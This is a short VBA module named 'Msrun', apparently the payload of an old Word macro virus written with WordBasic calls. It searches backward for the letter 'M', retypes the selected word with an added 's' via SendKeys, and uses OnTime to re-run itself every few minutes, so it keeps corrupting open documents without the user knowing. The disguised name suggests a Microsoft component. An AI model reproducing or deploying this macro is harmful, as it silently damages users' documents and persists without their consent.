   Attribute VB_Name = "Msrun"

   Public Sub main()
   If WordBasic.CountWindows() > 0 Then
   WordBasic.WordLeft (2)
   WordBasic.EditFind Find:="M", Direction:=0, Wrap:=0
   If WordBasic.AtEndOfDocument() = 0 Then
       WordBasic.SelectCurWord
       WordBasic.SendKeys WordBasic.[Selection$]() + "s"
   End If
   End If
   If WordBasic.Minute(WordBasic.Now()) < 52 Then
   WordBasic.OnTime Str(WordBasic.Hour(WordBasic.Now())) + ":" + Str(WordBasic.Minute(WordBasic.Now()) + 7), "MSrun"
   End If

   If WordBasic.Minute(WordBasic.Now()) > 52 Then
   WordBasic.OnTime Str(WordBasic.Hour(WordBasic.Now()) + 1) + ":" + "04", "MSrun"
   End If
   End Sub
